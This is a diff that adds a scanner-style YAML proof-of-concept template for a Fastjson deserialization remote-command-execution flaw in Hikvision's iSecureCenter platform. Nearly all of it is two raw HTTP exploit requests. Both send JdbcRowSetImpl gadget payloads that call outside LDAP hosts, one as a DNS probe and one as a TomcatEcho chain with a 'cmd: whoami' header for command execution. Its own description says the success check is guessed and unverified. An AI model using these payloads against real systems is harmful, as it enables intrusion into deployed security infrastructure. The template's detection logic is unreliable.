@@ -1,0 +1,66 @@
+id: poc-1f21de63f52d418bb83f
+info:
+  name: 海康威视iSecureCenter综合安防管理平台存在applyCTFastjson命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/1f21de63f52d418bb83f445acd5eee3e
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 1f21de63f52d418bb83f445acd5eee3e
+    fofa: '**hunter查询语法：**'
+http:
+- raw:
+  - 'POST /bic/ssoService/v1/applyCT HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
+
+    Content-Length: 5727
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+
+    Connection: close
+
+    Content-Type: application/json
+
+
+    {"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://mmmm.dns.cn","autoCommit":true},"hfe4zyyzldp":"="}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /bic/ssoService/v1/applyCT HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0
+
+    Accept: text/css,*/*;q=0.1
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    Content-Type:application/json
+
+    cmd:whoami
+
+    Content-Length: 215
+
+
+    {"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://1.2.3.4:1389/Basic/TomcatEcho","autoCommit":true},"hfe4zyyzldp":"="}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
